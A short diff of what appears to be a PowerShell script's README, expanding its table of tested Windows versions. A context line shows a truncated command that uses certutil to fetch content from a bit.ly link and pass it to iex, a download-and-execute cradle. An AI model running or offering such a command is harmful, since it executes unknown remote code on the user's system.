@@ -21,9 +21,12 @@ powershell "iex(((C:\Windows\System32\certutil -ping https://bit.ly/2tZuas2|&(GV
 
 Tested on following Operating Systems:
 
-|   System    |  x64  |  x86  |
-| ---         | :---: | :---: |
-| Windows 10  |  [x]  |  [ ]  |
-| Windows 8.1 |  [x]  |
+|   System        |  x64  |  x86  |
+| :---            | :---: | :---: |
+| Windows 10      |  [x]  |  [ ]  |
+| Windows 8.1     |  [x]  |  [ ]  |
+| Windows 8       |  [ ]  |  [ ]  |
+| Windows 7       |  [x]  |  [ ]  |
+| Windows Vista   |  [ ]  |  [ ]  |
 
 This Script is still in the early Alpha release!!! And has some bugs
